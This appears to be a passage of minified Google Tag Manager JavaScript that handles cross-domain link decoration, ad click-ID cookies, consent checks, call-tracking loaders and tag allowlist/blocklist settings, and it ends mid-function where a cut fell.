  function Tj(a, b) {
    var c = "FORM" === (a.tagName || "").toUpperCase(),
      d = Ej(b, 1, c),
      e = Ej(b, 2, c),
      f = Ej(b, 3, c);
    if (Oa(d)) {
      var h = Lj(d);
      c ? Uj("_gl", h, a) : Vj("_gl", h, a, !1);
    }
    if (!c && Oa(e)) {
      var l = Lj(e);
      Vj("_gl", l, a, !0);
    }
    for (var m in f) if (f.hasOwnProperty(m)) a: {
      var n = m,
        p = f[m],
        q = a;
      if (q.tagName) {
        if ("a" === q.tagName.toLowerCase()) {
          Vj(n, p, q);
          break a;
        }
        if ("form" === q.tagName.toLowerCase()) {
          Uj(n, p, q);
          break a;
        }
      }
      "string" == typeof q && Sj(n, p, q);
    }
  }
  function Vj(a, b, c, d) {
    if (c.href) {
      var e = Sj(a, b, c.href, void 0 === d ? !1 : d);
      ib.test(e) && (c.href = e);
    }
  }
  function Uj(a, b, c) {
    if (c && c.action) {
      var d = (c.method || "").toLowerCase();
      if ("get" === d) {
        for (var e = c.childNodes || [], f = !1, h = 0; h < e.length; h++) {
          var l = e[h];
          if (l.name === a) {
            l.setAttribute("value", b);
            f = !0;
            break;
          }
        }
        if (!f) {
          var m = D.createElement("input");
          m.setAttribute("type", "hidden");
          m.setAttribute("name", a);
          m.setAttribute("value", b);
          c.appendChild(m);
        }
      } else if ("post" === d) {
        var n = Sj(a, b, c.action);
        ib.test(n) && (c.action = n);
      }
    }
  }
  function zj(a) {
    try {
      var b;
      a: {
        for (var c = a, d = 100; c && 0 < d;) {
          if (c.href && c.nodeName.match(/^a(?:rea)?$/i)) {
            b = c;
            break a;
          }
          c = c.parentNode;
          d--;
        }
        b = null;
      }
      var e = b;
      if (e) {
        var f = e.protocol;
        "http:" !== f && "https:" !== f || Tj(e, e.hostname);
      }
    } catch (h) {}
  }
  function Aj(a) {
    try {
      if (a.action) {
        var b = sj(uj(a.action), "host");
        Tj(a, b);
      }
    } catch (c) {}
  }
  var Wj = function (a, b, c, d) {
      Cj();
      Dj(a, b, "fragment" === c ? 2 : 1, !!d, !1);
    },
    Xj = function (a, b) {
      Cj();
      Dj(a, [rj(z.location, "host", !0)], b, !0, !0);
    },
    Yj = function () {
      var a = D.location.hostname,
        b = Gj.exec(D.referrer);
      if (!b) return !1;
      var c = b[2],
        d = b[1],
        e = "";
      if (c) {
        var f = c.split("/"),
          h = f[1];
        e = "s" === h ? decodeURIComponent(f[2]) : decodeURIComponent(h);
      } else if (d) {
        if (0 === d.indexOf("xn--")) return !1;
        e = d.replace(/-/g, ".").replace(/\.\./g, "-");
      }
      var l = a.replace(Hj, ""),
        m = e.replace(Hj, ""),
        n;
      if (!(n = l === m)) {
        var p = "." + m;
        n = l.substring(l.length - p.length, l.length) === p;
      }
      return n;
    },
    Zj = function (a, b) {
      return !1 === a ? !1 : a || b || Yj();
    };
  var ak = ["1"],
    bk = {},
    ck = {},
    hk = function (a, b) {
      b = void 0 === b ? !0 : b;
      var c = dk(a.prefix);
      if (!bk[c]) if (ek(c, a.path, a.domain)) {
        var d = ck[dk(a.prefix)];
        fk(a, d ? d.id : void 0, d ? d.dg : void 0);
      } else {
        var e = wj("auiddc");
        if (e) ab("TAGGING", 17), bk[c] = e;else if (b) {
          var f = dk(a.prefix),
            h = Pi();
          if (0 === gk(f, h, a)) {
            var l = Lb("google_tag_data", {});
            l._gcl_au || (l._gcl_au = h);
          }
          ek(c, a.path, a.domain);
        }
      }
    };
  function fk(a, b, c) {
    var d = dk(a.prefix),
      e = bk[d];
    if (e) {
      var f = e.split(".");
      if (2 === f.length) {
        var h = Number(f[1]) || 0;
        if (h) {
          var l = e;
          b && (l = e + "." + b + "." + (c ? c : Math.floor(Ja() / 1E3)));
          gk(d, l, a, 1E3 * h);
        }
      }
    }
  }
  function gk(a, b, c, d) {
    var e = Ti(b, "1", c.domain, c.path),
      f = xj(c, d);
    f.eb = "ad_storage";
    return Li(a, e, f);
  }
  function ek(a, b, c) {
    var d = Si(a, b, c, ak, "ad_storage");
    if (!d) return !1;
    ik(a, d);
    return !0;
  }
  function ik(a, b) {
    var c = b.split(".");
    5 === c.length ? (bk[a] = c.slice(0, 2).join("."), ck[a] = {
      id: c.slice(2, 4).join("."),
      dg: Number(c[4]) || 0
    }) : 3 === c.length ? ck[a] = {
      id: c.slice(0, 2).join("."),
      dg: Number(c[2]) || 0
    } : bk[a] = b;
  }
  function dk(a) {
    return (a || "_gcl") + "_au";
  }
  function jk(a) {
    Of() ? Sf(function () {
      Mf("ad_storage") ? a() : Tf(a, "ad_storage");
    }, ["ad_storage"]) : a();
  }
  function kk(a) {
    var b = Qj(!0),
      c = dk(a.prefix);
    jk(function () {
      var d = b[c];
      if (d) {
        ik(c, d);
        var e = 1E3 * Number(bk[c].split(".")[1]);
        if (e) {
          ab("TAGGING", 16);
          var f = xj(a, e);
          f.eb = "ad_storage";
          var h = Ti(d, "1", a.domain, a.path);
          Li(c, h, f);
        }
      }
    });
  }
  function lk(a, b, c, d, e) {
    e = e || {};
    var f = function () {
      var h = {},
        l = Si(a, e.path, e.domain, ak, "ad_storage");
      l && (h[a] = l);
      return h;
    };
    jk(function () {
      Wj(f, b, c, d);
    });
  }
  ;
  var mk = function (a) {
    for (var b = [], c = D.cookie.split(";"), d = new RegExp("^\\s*" + (a || "_gac") + "_(UA-\\d+-\\d+)=\\s*(.+?)\\s*$"), e = 0; e < c.length; e++) {
      var f = c[e].match(d);
      f && b.push({
        qg: f[1],
        value: f[2],
        timestamp: Number(f[2].split(".")[1]) || 0
      });
    }
    b.sort(function (h, l) {
      return l.timestamp - h.timestamp;
    });
    return b;
  };
  function xk(a, b) {
    var c = mk(a),
      d = {};
    if (!c || !c.length) return d;
    for (var e = 0; e < c.length; e++) {
      var f = c[e].value.split(".");
      if (!("1" !== f[0] || b && 3 > f.length || !b && 3 !== f.length) && Number(f[1])) {
        d[c[e].qg] || (d[c[e].qg] = []);
        var h = {
          version: f[0],
          timestamp: 1E3 * Number(f[1]),
          R: f[2]
        };
        b && 3 < f.length && (h.labels = f.slice(3));
        d[c[e].qg].push(h);
      }
    }
    return d;
  }
  ;
  var yk = /^\w+$/,
    zk = /^[\w-]+$/,
    Ak = {
      aw: "_aw",
      dc: "_dc",
      gf: "_gf",
      ha: "_ha",
      gp: "_gp",
      gb: "_gb"
    },
    Bk = function () {
      return Bf().h() && Of() ? Mf("ad_storage") : !0;
    },
    Ck = function (a, b) {
      Nf("ad_storage") ? Bk() ? a() : Tf(a, "ad_storage") : b ? ab("TAGGING", 3) : Sf(function () {
        Ck(a, !0);
      }, ["ad_storage"]);
    },
    Ek = function (a) {
      return Dk(a).map(function (b) {
        return b.R;
      });
    },
    Dk = function (a) {
      var b = [];
      if (!zi(z) || !D.cookie) return b;
      var c = Ci(a, D.cookie, void 0, "ad_storage");
      if (!c || 0 == c.length) return b;
      for (var d = {}, e = 0; e < c.length; d = {
        R: d.R
      }, e++) {
        var f = Fk(c[e]);
        if (null != f) {
          var h = f,
            l = h.version;
          d.R = h.R;
          var m = h.timestamp,
            n = h.labels,
            p = xa(b, function (q) {
              return function (r) {
                return r.R === q.R;
              };
            }(d));
          p ? (p.timestamp = Math.max(p.timestamp, m), p.labels = Gk(p.labels, n || [])) : b.push({
            version: l,
            R: d.R,
            timestamp: m,
            labels: n
          });
        }
      }
      b.sort(function (q, r) {
        return r.timestamp - q.timestamp;
      });
      return Hk(b);
    };
  function Gk(a, b) {
    for (var c = {}, d = [], e = 0; e < a.length; e++) c[a[e]] = !0, d.push(a[e]);
    for (var f = 0; f < b.length; f++) c[b[f]] || d.push(b[f]);
    return d;
  }
  function Ik(a) {
    return a && "string" == typeof a && a.match(yk) ? a : "_gcl";
  }
  var Kk = function () {
      var a = uj(z.location.href),
        b = sj(a, "query", !1, void 0, "gclid"),
        c = sj(a, "query", !1, void 0, "gclsrc"),
        d = sj(a, "query", !1, void 0, "wbraid"),
        e = sj(a, "query", !1, void 0, "dclid");
      if (!b || !c || !d) {
        var f = a.hash.replace("#", "");
        b = b || pj(f, "gclid");
        c = c || pj(f, "gclsrc");
        d = d || pj(f, "wbraid");
      }
      return Jk(b, c, e, d);
    },
    Jk = function (a, b, c, d) {
      var e = {},
        f = function (h, l) {
          e[l] || (e[l] = []);
          e[l].push(h);
        };
      e.gclid = a;
      e.gclsrc = b;
      e.dclid = c;
      void 0 !== d && zk.test(d) && (e.gbraid = d, f(d, "gb"));
      if (void 0 !== a && a.match(zk)) switch (b) {
        case void 0:
          f(a, "aw");
          break;
        case "aw.ds":
          f(a, "aw");
          f(a, "dc");
          break;
        case "ds":
          f(a, "dc");
          break;
        case "3p.ds":
          f(a, "dc");
          break;
        case "gf":
          f(a, "gf");
          break;
        case "ha":
          f(a, "ha");
      }
      c && f(c, "dc");
      return e;
    },
    Mk = function (a) {
      var b = Kk();
      Ck(function () {
        Lk(b, !1, a);
      });
    };
  function Lk(a, b, c, d, e) {
    function f(w, x) {
      var y = Nk(w, h);
      y && (Li(y, x, l), m = !0);
    }
    c = c || {};
    e = e || [];
    var h = Ik(c.prefix);
    d = d || Ja();
    var l = xj(c, d, !0);
    l.eb = "ad_storage";
    var m = !1,
      n = Math.round(d / 1E3),
      p = function (w) {
        var x = ["GCL", n, w];
        0 < e.length && x.push(e.join("."));
        return x.join(".");
      };
    a.aw && f("aw", p(a.aw[0]));
    a.dc && f("dc", p(a.dc[0]));
    a.gf && f("gf", p(a.gf[0]));
    a.ha && f("ha", p(a.ha[0]));
    a.gp && f("gp", p(a.gp[0]));
    if (!m && a.gb) {
      var q = a.gb[0],
        r = Nk("gb", h),
        t = !1;
      if (!b) for (var u = Dk(r), v = 0; v < u.length; v++) u[v].R === q && u[v].labels && 0 < u[v].labels.length && (t = !0);
      t || f("gb", p(q));
    }
  }
  var Pk = function (a, b) {
      var c = Qj(!0);
      Ck(function () {
        for (var d = Ik(b.prefix), e = 0; e < a.length; ++e) {
          var f = a[e];
          if (void 0 !== Ak[f]) {
            var h = Nk(f, d),
              l = c[h];
            if (l) {
              var m = Math.min(Ok(l), Ja()),
                n;
              b: {
                var p = m;
                if (zi(z)) for (var q = Ci(h, D.cookie, void 0, "ad_storage"), r = 0; r < q.length; ++r) if (Ok(q[r]) > p) {
                  n = !0;
                  break b;
                }
                n = !1;
              }
              if (!n) {
                var t = xj(b, m, !0);
                t.eb = "ad_storage";
                Li(h, l, t);
              }
            }
          }
        }
        Lk(Jk(c.gclid, c.gclsrc), !1, b);
      });
    },
    Nk = function (a, b) {
      var c = Ak[a];
      if (void 0 !== c) return b + c;
    },
    Ok = function (a) {
      return 0 !== Qk(a.split(".")).length ? 1E3 * (Number(a.split(".")[1]) || 0) : 0;
    };
  function Fk(a) {
    var b = Qk(a.split("."));
    return 0 === b.length ? null : {
      version: b[0],
      R: b[2],
      timestamp: 1E3 * (Number(b[1]) || 0),
      labels: b.slice(3)
    };
  }
  function Qk(a) {
    return 3 > a.length || "GCL" !== a[0] && "1" !== a[0] || !/^\d+$/.test(a[1]) || !zk.test(a[2]) ? [] : a;
  }
  var Rk = function (a, b, c, d, e) {
      if (va(b) && zi(z)) {
        var f = Ik(e),
          h = function () {
            for (var l = {}, m = 0; m < a.length; ++m) {
              var n = Nk(a[m], f);
              if (n) {
                var p = Ci(n, D.cookie, void 0, "ad_storage");
                p.length && (l[n] = p.sort()[p.length - 1]);
              }
            }
            return l;
          };
        Ck(function () {
          Wj(h, b, c, d);
        });
      }
    },
    Hk = function (a) {
      return a.filter(function (b) {
        return zk.test(b.R);
      });
    },
    Sk = function (a, b) {
      if (zi(z)) {
        for (var c = Ik(b.prefix), d = {}, e = 0; e < a.length; e++) Ak[a[e]] && (d[a[e]] = Ak[a[e]]);
        Ck(function () {
          k(d, function (f, h) {
            var l = Ci(c + h, D.cookie, void 0, "ad_storage");
            l.sort(function (t, u) {
              return Ok(u) - Ok(t);
            });
            if (l.length) {
              var m = l[0],
                n = Ok(m),
                p = 0 !== Qk(m.split(".")).length ? m.split(".").slice(3) : [],
                q = {},
                r;
              r = 0 !== Qk(m.split(".")).length ? m.split(".")[2] : void 0;
              q[f] = [r];
              Lk(q, !0, b, n, p);
            }
          });
        });
      }
    };
  function Tk(a, b) {
    for (var c = 0; c < b.length; ++c) if (a[b[c]]) return !0;
    return !1;
  }
  var Uk = function (a) {
      function b(e, f, h) {
        h && (e[f] = h);
      }
      if (Of()) {
        var c = Kk();
        if (Tk(c, a)) {
          var d = {};
          b(d, "gclid", c.gclid);
          b(d, "dclid", c.dclid);
          b(d, "gclsrc", c.gclsrc);
          b(d, "wbraid", c.gbraid);
          Xj(function () {
            return d;
          }, 3);
          Xj(function () {
            var e = {};
            return e._up = "1", e;
          }, 1);
        }
      }
    },
    Vk = function (a, b, c, d) {
      var e = [];
      c = c || {};
      if (!Bk()) return e;
      var f = Dk(a);
      if (!f.length) return e;
      for (var h = 0; h < f.length; h++) -1 === (f[h].labels || []).indexOf(b) ? e.push(0) : e.push(1);
      if (d) return e;
      if (1 !== e[0]) {
        var l = f[0],
          m = f[0].timestamp,
          n = [l.version, Math.round(m / 1E3), l.R].concat(l.labels || [], [b]).join("."),
          p = xj(c, m, !0);
        p.eb = "ad_storage";
        Li(a, n, p);
      }
      return e;
    };
  function Wk(a, b) {
    var c = Ik(b),
      d = Nk(a, c);
    if (!d) return 0;
    for (var e = Dk(d), f = 0, h = 0; h < e.length; h++) f = Math.max(f, e[h].timestamp);
    return f;
  }
  function Xk(a) {
    var b = 0,
      c;
    for (c in a) for (var d = a[c], e = 0; e < d.length; e++) b = Math.max(b, Number(d[e].timestamp));
    return b;
  }
  var Yk = function (a) {
    var b = Math.max(Wk("aw", a), Xk(Bk() ? xk() : {}));
    return Math.max(Wk("gb", a), Xk(Bk() ? xk("_gac_gb", !0) : {})) > b;
  };
  var cl = /[A-Z]+/,
    dl = /\s/,
    el = function (a, b) {
      if (g(a)) {
        a = Ga(a);
        var c = a.indexOf("-");
        if (!(0 > c)) {
          var d = a.substring(0, c);
          if (cl.test(d)) {
            var e = a.substring(c + 1),
              f;
            if (b) {
              var h = function (n) {
                var p = n.indexOf("/");
                return 0 > p ? [n] : [n.substring(0, p), n.substring(p + 1)];
              };
              f = h(e);
              if ("DC" === d && 2 === f.length) {
                var l = h(f[1]);
                2 === l.length && (f[1] = l[0], f.push(l[1]));
              }
            } else {
              f = e.split("/");
              for (var m = 0; m < f.length; m++) if (!f[m] || dl.test(f[m]) && ("AW" !== d || 1 !== m)) return;
            }
            return {
              id: a,
              prefix: d,
              X: d + "-" + f[0],
              J: f
            };
          }
        }
      }
    },
    gl = function (a, b) {
      for (var c = {}, d = 0; d < a.length; ++d) {
        var e = el(a[d], b);
        e && (c[e.id] = e);
      }
      fl(c);
      var f = [];
      k(c, function (h, l) {
        f.push(l);
      });
      return f;
    };
  function fl(a) {
    var b = [],
      c;
    for (c in a) if (a.hasOwnProperty(c)) {
      var d = a[c];
      "AW" === d.prefix && d.J[1] && b.push(d.X);
    }
    for (var e = 0; e < b.length; ++e) delete a[b[e]];
  }
  ;
  var hl = function (a, b, c, d) {
    var e = Rb(),
      f;
    if (1 === e) a: {
      var h = Oe;
      h = h.toLowerCase();
      for (var l = "https://" + h, m = "http://" + h, n = 1, p = D.getElementsByTagName("script"), q = 0; q < p.length && 100 > q; q++) {
        var r = p[q].src;
        if (r) {
          r = r.toLowerCase();
          if (0 === r.indexOf(m)) {
            f = 3;
            break a;
          }
          1 === n && 0 === r.indexOf(l) && (n = 2);
        }
      }
      f = n;
    } else f = e;
    return (2 === f || d || "http:" != z.location.protocol ? a : b) + c;
  };
  var jl = function (a, b, c) {
      if (z[a.functionName]) return b.hg && G(b.hg), z[a.functionName];
      var d = il();
      z[a.functionName] = d;
      if (a.ze) for (var e = 0; e < a.ze.length; e++) z[a.ze[e]] = z[a.ze[e]] || il();
      a.Ie && void 0 === z[a.Ie] && (z[a.Ie] = c);
      Qb(hl("https://", "http://", a.pg), b.hg, b.pl);
      return d;
    },
    il = function () {
      var a = function () {
        a.q = a.q || [];
        a.q.push(arguments);
      };
      return a;
    },
    kl = {
      functionName: "_googWcmImpl",
      Ie: "_googWcmAk",
      pg: "www.gstatic.com/wcm/loader.js"
    },
    ll = {
      functionName: "_gaPhoneImpl",
      Ie: "ga_wpid",
      pg: "www.gstatic.com/gaphone/loader.js"
    },
    ml = {
      Hi: "",
      Vj: "5"
    },
    nl = {
      functionName: "_googCallTrackingImpl",
      ze: [ll.functionName, kl.functionName],
      pg: "www.gstatic.com/call-tracking/call-tracking_" + (ml.Hi || ml.Vj) + ".js"
    },
    ol = {},
    pl = function (a, b, c, d) {
      J(22);
      if (c) {
        d = d || {};
        var e = jl(kl, d, a),
          f = {
            ak: a,
            cl: b
          };
        void 0 === d.cb && (f.autoreplace = c);
        e(2, d.cb, f, c, 0, Ia(), d.options);
      }
    },
    ql = function (a, b, c, d) {
      J(21);
      if (b && c) {
        d = d || {};
        for (var e = {
            countryNameCode: c,
            destinationNumber: b,
            retrievalTime: Ia()
          }, f = 0; f < a.length; f++) {
          var h = a[f];
          ol[h.id] || (h && "AW" === h.prefix && !e.adData && 2 <= h.J.length ? (e.adData = {
            ak: h.J[0],
            cl: h.J[1]
          }, ol[h.id] = !0) : h && "UA" === h.prefix && !e.gaData && (e.gaData = {
            gaWpid: h.X
          }, ol[h.id] = !0));
        }
        (e.gaData || e.adData) && jl(nl, d)(d.cb, e, d.options);
      }
    },
    rl = function () {
      var a = !1;
      return a;
    },
    sl = function (a, b) {
      if (a) if (Vi()) {} else {
        if (g(a)) {
          var c = el(a);
          if (!c) return;
          a = c;
        }
        var d = void 0,
          e = !1,
          f = T(b, K.g.Bj);
        if (f && va(f)) {
          d = [];
          for (var h = 0; h < f.length; h++) {
            var l = el(f[h]);
            l && (d.push(l), (a.id === l.id || a.id === a.X && a.X === l.X) && (e = !0));
          }
        }
        if (!d || e) {
          var m = T(b, K.g.kh),
            n;
          if (m) {
            va(m) ? n = m : n = [m];
            var p = T(b, K.g.ih),
              q = T(b, K.g.jh),
              r = T(b, K.g.lh),
              t = T(b, K.g.Aj),
              u = p || q,
              v = 1;
            "UA" !== a.prefix || d || (v = 5);
            for (var w = 0; w < n.length; w++) if (w < v) if (d) ql(d, n[w], t, {
              cb: u,
              options: r
            });else if ("AW" === a.prefix && a.J[1]) rl() ? ql([a], n[w], t || "US", {
              cb: u,
              options: r
            }) : pl(a.J[0], a.J[1], n[w], {
              cb: u,
              options: r
            });else if ("UA" === a.prefix) if (rl()) ql([a], n[w], t || "US", {
              cb: u
            });else {
              var x = a.X,
                y = n[w],
                A = {
                  cb: u
                };
              J(23);
              if (y) {
                A = A || {};
                var B = jl(ll, A, x),
                  C = {};
                void 0 !== A.cb ? C.receiver = A.cb : C.replace = y;
                C.ga_wpid = x;
                C.destination = y;
                B(2, Ia(), C);
              }
            }
          }
        }
      }
    };
  var tl,
    ul = !1,
    vl = function (a) {
      if (!ul) {
        ul = !0;
        tl = tl || {};
      }
      return tl[a];
    };
  var wl = function (a, b, c) {
    this.target = a;
    this.eventName = b;
    this.s = c;
    this.h = {};
    this.metadata = H(c.eventMetadata || {});
    this.isAborted = !1;
  };
  wl.prototype.copyToHitData = function (a, b) {
    var c = T(this.s, a);
    void 0 !== c ? this.h[a] = c : void 0 !== b && (this.h[a] = b);
  };
  var xl = function (a, b, c) {
    var d = vl(a.target.X);
    return d && d.hasOwnProperty(b) ? d[b] : c;
  };
  function yl(a) {
    return {
      getDestinationId: function () {
        return a.target.X;
      },
      getEventName: function () {
        return a.eventName;
      },
      setEventName: function (b) {
        a.eventName = b;
      },
      getHitData: function (b) {
        return a.h[b];
      },
      setHitData: function (b, c) {
        a.h[b] = c;
      },
      setHitDataIfNotDefined: function (b, c) {
        void 0 === a.h[b] && (a.h[b] = c);
      },
      copyToHitData: function (b, c) {
        a.copyToHitData(b, c);
      },
      getMetadata: function (b) {
        return a.metadata[b];
      },
      setMetadata: function (b, c) {
        a.metadata[b] = c;
      },
      isAborted: function () {
        return a.isAborted;
      },
      abort: function () {
        a.isAborted = !0;
      },
      getFromEventContext: function (b) {
        return T(a.s, b);
      },
      xm: function () {
        return a;
      },
      getHitKeys: function () {
        return Object.keys(a.h);
      }
    };
  }
  ;
  function Ul(a) {
    var b = T(a.s, K.g.qb),
      c = T(a.s, K.g.pb);
    b && !c ? (a.eventName !== K.g.la && a.eventName !== K.g.Qd && J(131), a.isAborted = !0) : !b && c && (J(132), a.isAborted = !0);
  }
  ;
  var Wl = function () {
      var a = z.screen;
      return {
        width: a ? a.width : 0,
        height: a ? a.height : 0
      };
    },
    Xl = function (a) {
      if (D.hidden) return !0;
      var b = a.getBoundingClientRect();
      if (b.top == b.bottom || b.left == b.right || !z.getComputedStyle) return !0;
      var c = z.getComputedStyle(a, null);
      if ("hidden" === c.visibility) return !0;
      for (var d = a, e = c; d;) {
        if ("none" === e.display) return !0;
        var f = e.opacity,
          h = e.filter;
        if (h) {
          var l = h.indexOf("opacity(");
          0 <= l && (h = h.substring(l + 8, h.indexOf(")", l)), "%" == h.charAt(h.length - 1) && (h = h.substring(0, h.length - 1)), f = Math.min(h, f));
        }
        if (void 0 !== f && 0 >= f) return !0;
        (d = d.parentElement) && (e = z.getComputedStyle(d, null));
      }
      return !1;
    };
  function Sm() {
    return "attribution-reporting";
  }
  function Tm(a) {
    var b;
    b = void 0 === b ? document : b;
    var c;
    return !(null == (c = b.featurePolicy) || !c.allowedFeatures().includes(a));
  }
  ;
  var Um = !1;
  function Vm() {
    if (Tm("join-ad-interest-group") && ta(Jb.joinAdInterestGroup)) return !0;
    Um || (Ih('AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9'), Um = !0);
    return Tm("join-ad-interest-group") && ta(Jb.joinAdInterestGroup);
  }
  function Wm(a, b) {
    var c = void 0;
    try {
      c = D.querySelector('iframe[data-tagging-id="' + b + '"]');
    } catch (e) {}
    if (c) {
      var d = Number(c.dataset.loadTime);
      if (d && 6E4 > Ja() - d) {
        ab("TAGGING", 9);
        return;
      }
    } else try {
      if (50 <= D.querySelectorAll('iframe[allow="join-ad-interest-group"][data-tagging-id*="-"]').length) {
        ab("TAGGING", 10);
        return;
      }
    } catch (e) {}
    Sb(a, void 0, {
      allow: "join-ad-interest-group"
    }, {
      taggingId: b,
      loadTime: Ja()
    }, c);
  }
  function Xm() {
    return "https://td.doubleclick.net";
  }
  ;
  var Ym = RegExp("^UA-\\d+-\\d+%3A[\\w-]+(?:%2C[\\w-]+)*(?:%3BUA-\\d+-\\d+%3A[\\w-]+(?:%2C[\\w-]+)*)*$"),
    Zm = /^~?[\w-]+(?:\.~?[\w-]+)*$/,
    $m = /^\d+\.fls\.doubleclick\.net$/,
    an = /;gac=([^;?]+)/,
    bn = /;gacgb=([^;?]+)/,
    cn = /;gclaw=([^;?]+)/,
    dn = /;gclgb=([^;?]+)/;
  function en(a, b) {
    if ($m.test(D.location.host)) {
      var c = D.location.href.match(b);
      return c && 2 == c.length && c[1].match(Ym) ? decodeURIComponent(c[1]) : "";
    }
    var d = [],
      e;
    for (e in a) {
      for (var f = [], h = a[e], l = 0; l < h.length; l++) f.push(h[l].R);
      d.push(e + ":" + f.join(","));
    }
    return 0 < d.length ? d.join(";") : "";
  }
  var fn = function (a, b, c) {
    var d = Bk() ? xk("_gac_gb", !0) : {},
      e = [],
      f = !1,
      h;
    for (h in d) {
      var l = Vk("_gac_gb_" + h, a, b, c);
      f = f || 0 !== l.length && l.some(function (m) {
        return 1 === m;
      });
      e.push(h + ":" + l.join(","));
    }
    return {
      yk: f ? e.join(";") : "",
      xk: en(d, bn)
    };
  };
  function gn(a, b, c) {
    if ($m.test(D.location.host)) {
      var d = D.location.href.match(c);
      if (d && 2 == d.length && d[1].match(Zm)) return [{
        R: d[1]
      }];
    } else return Dk((a || "_gcl") + b);
    return [];
  }
  var hn = function (a) {
      return gn(a, "_aw", cn).map(function (b) {
        return b.R;
      }).join(".");
    },
    jn = function (a) {
      return gn(a, "_gb", dn).map(function (b) {
        return b.R;
      }).join(".");
    },
    kn = function (a, b) {
      var c = Vk((b && b.prefix || "_gcl") + "_gb", a, b);
      return 0 === c.length || c.every(function (d) {
        return 0 === d;
      }) ? "" : c.join(".");
    };
  var ln = function () {
    if (ta(z.__uspapi)) {
      var a = "";
      try {
        z.__uspapi("getUSPData", 1, function (b, c) {
          if (c && b) {
            var d = b.uspString;
            d && RegExp("^[\\da-zA-Z-]{1,20}$").test(d) && (a = d);
          }
        });
      } catch (b) {}
      return a;
    }
  };
  var Xn = {
    D: {
      sg: "ads_conversion_hit",
      Ze: "container_execute_start",
      vg: "container_setup_end",
      af: "container_setup_start",
      ug: "container_execute_end",
      wg: "container_yield_end",
      bf: "container_yield_start",
      xh: "event_execute_end",
      wh: "event_evaluation_end",
      Af: "event_evaluation_start",
      yh: "event_setup_end",
      fd: "event_setup_start",
      zh: "ga4_conversion_hit",
      kd: "page_load",
      jm: "pageview",
      wb: "snippet_load",
      Jh: "tag_callback_error",
      Kh: "tag_callback_failure",
      Lh: "tag_callback_success",
      Mh: "tag_execute_end",
      nc: "tag_execute_start"
    }
  };
  function Yn() {
    function a(c, d) {
      var e = cb(d);
      e && b.push(c + "=" + e);
    }
    var b = [];
    a("&u", "GTM");
    a("&ut", "TAGGING");
    a("&h", "HEALTH");
    return b.join("");
  }
  ;
  var Zn = !1,
    $n = "L S Y E EC TC HTC".split(" "),
    ao = ["S", "V", "E"],
    bo = ["TS", "TI", "TE"];
  var Fo = function (a) {},
    Go = function (a) {},
    Ho = function () {},
    Io = function (a, b) {},
    Jo = function (a, b) {},
    Ko = function (a, b) {},
    Lo = function (a, b) {},
    co = function (a, b, c, d, e, f) {
      var h;
      h = void 0 === h ? !1 : h;
      var l = {};
      return l;
    },
    eo = function (a) {
      var b = !1;
      return b;
    },
    fo = function (a, b) {},
    Mo = function () {
      var a = {};
      return a;
    },
    yo = function (a) {
      a = void 0 === a ? !0 : a;
      var b = {};
      return b;
    },
    No = function () {},
    Oo = function (a, b) {},
    Po = function (a, b, c) {};
  var Qo = function (a, b) {
    var c,
      d = z.GooglebQhCsO;
    d || (d = {}, z.GooglebQhCsO = d);
    c = d;
    if (c[a]) return !1;
    c[a] = [];
    c[a][0] = b;
    return !0;
  };
  var Ro = function (a, b, c) {
    var d = Dh(a, "fmt");
    if (b) {
      var e = Dh(a, "random"),
        f = Dh(a, "label") || "";
      if (!e) return !1;
      var h = bj(decodeURIComponent(f.replace(/\+/g, " ")) + ":" + decodeURIComponent(e.replace(/\+/g, " ")));
      if (!Qo(h, b)) return !1;
    }
    d && 4 != d && (a = Fh(a, "rfmt", d));
    var l = Fh(a, "fmt", 4);
    Qb(l, function () {
      z.google_noFurtherRedirects && b && b.call && (z.google_noFurtherRedirects = null, b());
    }, void 0, c, D.getElementsByTagName("script")[0].parentElement || void 0);
    return !0;
  };
  var gp = function () {
      this.h = {};
    },
    hp = function (a, b, c) {
      null != c && (a.h[b] = c);
    },
    ip = function (a) {
      return Object.keys(a.h).map(function (b) {
        return encodeURIComponent(b) + "=" + encodeURIComponent(a.h[b]);
      }).join("&");
    },
    kp = function (a, b, c, d) {};
  function mp(a, b) {
    if (data.entities && data.entities[a]) return data.entities[a][b];
  }
  ;
  var op = function (a) {
      var b = qg();
      np(b).event && np(b).event.push(a);
    },
    pp = function () {
      var a = np(qg());
      return a.event ? a.event : [];
    };
  function np(a) {
    var b,
      c = Ae.r;
    c || (c = {
      container: {}
    }, Ae.r = c);
    b = c;
    var d = b.container[a];
    d || (d = {
      entity: [],
      event: []
    }, b.container[a] = d);
    return d;
  }
  ;
  var qp = new RegExp(/^(.*\.)?(google|youtube|blogger|withgoogle)(\.com?)?(\.[a-z]{2})?\.?$/),
    rp = {
      cl: ["ecl"],
      customPixels: ["nonGooglePixels"],
      ecl: ["cl"],
      ehl: ["hl"],
      hl: ["ehl"],
      html: ["customScripts", "customPixels", "nonGooglePixels", "nonGoogleScripts", "nonGoogleIframes"],
      customScripts: ["html", "customPixels", "nonGooglePixels", "nonGoogleScripts", "nonGoogleIframes"],
      nonGooglePixels: [],
      nonGoogleScripts: ["nonGooglePixels"],
      nonGoogleIframes: ["nonGooglePixels"]
    },
    sp = {
      cl: ["ecl"],
      customPixels: ["customScripts", "html"],
      ecl: ["cl"],
      ehl: ["hl"],
      hl: ["ehl"],
      html: ["customScripts"],
      customScripts: ["html"],
      nonGooglePixels: ["customPixels", "customScripts", "html", "nonGoogleScripts", "nonGoogleIframes"],
      nonGoogleScripts: ["customScripts", "html"],
      nonGoogleIframes: ["customScripts", "html", "nonGoogleScripts"]
    },
    tp = "google customPixels customScripts html nonGooglePixels nonGoogleScripts nonGoogleIframes".split(" "),
    wp = function (a) {
      var b = $e("gtm.allowlist") || $e("gtm.whitelist");
      b && J(9);
      Ge && (b = ["google", "gtagfl", "lcl", "zone"]);
      up() && (Ge ? J(116) : J(117), vp && (b = [], window.console && window.console.log && window.console.log("GTM blocked. See go/13687728.")));
      var c = b && Pa(Fa(b), rp),
        d = $e("gtm.blocklist") || $e("gtm.blacklist");
      d || (d = $e("tagTypeBlacklist")) && J(3);
      d ? J(8) : d = [];
      up() && (d = Fa(d), d.push("nonGooglePixels", "nonGoogleScripts", "sandboxedScripts"));
